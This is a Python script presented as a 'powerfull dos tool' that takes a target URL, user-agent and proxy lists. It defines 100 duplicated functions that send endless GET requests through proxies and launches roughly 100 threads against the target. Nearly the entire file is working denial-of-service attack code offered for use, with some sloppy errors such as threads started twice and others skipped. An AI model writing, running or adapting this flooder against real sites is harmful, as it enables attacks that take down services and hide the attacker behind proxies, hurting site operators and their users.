import requests as r
import threading
import argparse
import os

os.system("clear")
def banner():
	print('''
█▀▀ █▀ █▀█ █▀▀ █ █▀▀ ▀█▀ █▄█
█▀░ ▄█ █▄█ █▄▄ █ ██▄ ░█░ ░█░''')


banner()
print("")

parser = argparse.ArgumentParser(description="powerfull dos tool \n script by spy")
parser.add_argument("-u",help="Enter your target url")
parser.add_argument("-ua",default="uagent",help="Enter your user agent txt")
parser.add_argument("-p",default="http",help="Enter your proxy txt")
args = parser.parse_args()

url = str(args.u)
uagent = str(args.ua)
proxy = str(args.p)
 
 
fua = open(uagent, 'r')
fp = open(proxy, 'r')
for ua in fua.read().split("\n"):
    for proxy in fp.read().split("\n"):

        headers = {"user-agent": ua}
        proxies = {"http": f"http://{proxy}"}
        x1 = r.get(url, headers=headers , proxies=proxies)


        def r1 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r2 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r3 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r4 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r5 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r6 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r7 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r8 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r9 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r10 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r11 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r12 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r13 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r14 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r15 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r16 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r17 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r18 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r19 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r20 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r21 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r22 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r23 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r24 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r25 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r26 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r27 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r28 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r29 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r30 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r31 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r32 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r33 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r34 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r35 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r36 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r37 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r38 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r39 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r40 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r41 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r42 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r43 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r44 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r45 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r46 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r47 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r48 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r49 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r50 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r51 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r52 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r53 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r54 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r55 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r56 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r57 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r58 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r59 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r60 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r61 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r62 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r63 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r64 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r65 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r66 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r67 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r68 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r69 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r70 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r71 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r72 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r73 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r74 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r75 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r76 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r77 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r78 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r79 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r80 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r81 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r82 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r83 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r84 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r85 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r86 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r87 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r88 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r89 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r90 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r91 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r92 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r93 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r94 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r95 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r96 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r97 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r98 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r99 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r100 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def dos():
            t1 = threading.Thread(target=r1, args=(url,))
            t2 = threading.Thread(target=r2, args=(url,))
            t3 = threading.Thread(target=r3, args=(url,))
            t4 = threading.Thread(target=r4, args=(url,))
            t5 = threading.Thread(target=r5, args=(url,))
            t6 = threading.Thread(target=r6, args=(url,))
            t7 = threading.Thread(target=r7, args=(url,))
            t8 = threading.Thread(target=r8, args=(url,))
            t9 = threading.Thread(target=r9, args=(url,))
            t10 = threading.Thread(target=r10, args=(url,))
            t11 = threading.Thread(target=r11, args=(url,))
            t12 = threading.Thread(target=r12, args=(url,))
            t13 = threading.Thread(target=r13, args=(url,))
            t14 = threading.Thread(target=r14, args=(url,))
            t15 = threading.Thread(target=r15, args=(url,))
            t16 = threading.Thread(target=r16, args=(url,))
            t17 = threading.Thread(target=r17, args=(url,))
            t18 = threading.Thread(target=r18, args=(url,))
            t19 = threading.Thread(target=r19, args=(url,))
            t20 = threading.Thread(target=r20, args=(url,))
            t21 = threading.Thread(target=r21, args=(url,))
            t22 = threading.Thread(target=r22, args=(url,))
            t23 = threading.Thread(target=r23, args=(url,))
            t24 = threading.Thread(target=r24, args=(url,))
            t25 = threading.Thread(target=r25, args=(url,))
            t26 = threading.Thread(target=r26, args=(url,))
            t27 = threading.Thread(target=r27, args=(url,))
            t28 = threading.Thread(target=r28, args=(url,))
            t29 = threading.Thread(target=r29, args=(url,))
            t30 = threading.Thread(target=r30, args=(url,))
            t31 = threading.Thread(target=r1, args=(url,))
            t32 = threading.Thread(target=r2, args=(url,))
            t33 = threading.Thread(target=r3, args=(url,))
            t34 = threading.Thread(target=r4, args=(url,))
            t35 = threading.Thread(target=r5, args=(url,))
            t36 = threading.Thread(target=r6, args=(url,))
            t37 = threading.Thread(target=r7, args=(url,))
            t38 = threading.Thread(target=r8, args=(url,))
            t39 = threading.Thread(target=r9, args=(url,))
            t40 = threading.Thread(target=r10, args=(url,))
            t41 = threading.Thread(target=r11, args=(url,))
            t42 = threading.Thread(target=r12, args=(url,))
            t43 = threading.Thread(target=r13, args=(url,))
            t44 = threading.Thread(target=r14, args=(url,))
            t45 = threading.Thread(target=r15, args=(url,))
            t46 = threading.Thread(target=r16, args=(url,))
            t47 = threading.Thread(target=r17, args=(url,))
            t48 = threading.Thread(target=r18, args=(url,))
            t49 = threading.Thread(target=r19, args=(url,))
            t50 = threading.Thread(target=r20, args=(url,))
            t51 = threading.Thread(target=r21, args=(url,))
            t52 = threading.Thread(target=r22, args=(url,))
            t53 = threading.Thread(target=r23, args=(url,))
            t54 = threading.Thread(target=r24, args=(url,))
            t55 = threading.Thread(target=r25, args=(url,))
            t56 = threading.Thread(target=r26, args=(url,))
            t57 = threading.Thread(target=r27, args=(url,))
            t58 = threading.Thread(target=r28, args=(url,))
            t59 = threading.Thread(target=r29, args=(url,))
            t60 = threading.Thread(target=r30, args=(url,))
            t61 = threading.Thread(target=r1, args=(url,))
            t62 = threading.Thread(target=r2, args=(url,))
            t63 = threading.Thread(target=r3, args=(url,))
            t64 = threading.Thread(target=r4, args=(url,))
            t65 = threading.Thread(target=r5, args=(url,))
            t66 = threading.Thread(target=r6, args=(url,))
            t67 = threading.Thread(target=r7, args=(url,))
            t68 = threading.Thread(target=r8, args=(url,))
            t69 = threading.Thread(target=r9, args=(url,))
            t70 = threading.Thread(target=r10, args=(url,))
            t71 = threading.Thread(target=r11, args=(url,))
            t72 = threading.Thread(target=r12, args=(url,))
            t73 = threading.Thread(target=r13, args=(url,))
            t74 = threading.Thread(target=r14, args=(url,))
            t75 = threading.Thread(target=r15, args=(url,))
            t76 = threading.Thread(target=r16, args=(url,))
            t77 = threading.Thread(target=r17, args=(url,))
            t78 = threading.Thread(target=r18, args=(url,))
            t79 = threading.Thread(target=r19, args=(url,))
            t80 = threading.Thread(target=r20, args=(url,))
            t81 = threading.Thread(target=r21, args=(url,))
            t82 = threading.Thread(target=r22, args=(url,))
            t83 = threading.Thread(target=r23, args=(url,))
            t84 = threading.Thread(target=r24, args=(url,))
            t85 = threading.Thread(target=r25, args=(url,))
            t86 = threading.Thread(target=r26, args=(url,))
            t87 = threading.Thread(target=r27, args=(url,))
            t88 = threading.Thread(target=r28, args=(url,))
            t89 = threading.Thread(target=r29, args=(url,))
            t90 = threading.Thread(target=r30, args=(url,))
            t91 = threading.Thread(target=r1, args=(url,))
            t92 = threading.Thread(target=r2, args=(url,))
            t93 = threading.Thread(target=r3, args=(url,))
            t94 = threading.Thread(target=r4, args=(url,))
            t95 = threading.Thread(target=r5, args=(url,))
            t96 = threading.Thread(target=r6, args=(url,))
            t97 = threading.Thread(target=r7, args=(url,))
            t98 = threading.Thread(target=r8, args=(url,))
            t99 = threading.Thread(target=r9, args=(url,))
            t100 = threading.Thread(target=r10, args=(url,))

            t1.start()
            t2.start()
            t3.start()
            t4.start()
            t5.start()
            t6.start()
            t7.start()
            t8.start()
            t9.start()
            t10.start()
            t11.start()
            t12.start()
            t13.start()
            t14.start()
            t15.start()
            t16.start()
            t17.start()
            t18.start()
            t19.start()
            t20.start()
            t21.start()
            t22.start()
            t23.start()
            t24.start()
            t25.start()
            t26.start()
            t27.start()
            t28.start()
            t29.start()
            t30.start()
            t31.start()
            t32.start()
            t33.start()
            t34.start()
            t35.start()
            t36.start()
            t47.start()
            t48.start()
            t39.start()
            t40.start()
            t41.start()
            t42.start()
            t43.start()
            t44.start()
            t45.start()
            t46.start()
            t47.start()
            t48.start()
            t49.start()
            t50.start()
            t51.start()
            t52.start()
            t53.start()
            t54.start()
            t55.start()
            t56.start()
            t57.start()
            t58.start()
            t59.start()
            t60.start()
            t61.start()
            t62.start()
            t63.start()
            t64.start()
            t65.start()
            t66.start()
            t67.start()
            t68.start()
            t69.start()
            t70.start()
            t71.start()
            t72.start()
            t73.start()
            t74.start()
            t75.start()
            t76.start()
            t77.start()
            t78.start()
            t79.start()
            t80.start()
            t81.start()
            t82.start()
            t83.start()
            t84.start()
            t85.start()
            t86.start()
            t87.start()
            t88.start()
            t89.start()
            t90.start()
            t91.start()
            t92.start()
            t93.start()
            t94.start()
            t95.start()
            t96.start()
            t97.start()
            t98.start()
            t99.start()
            t100.start()
        dos()




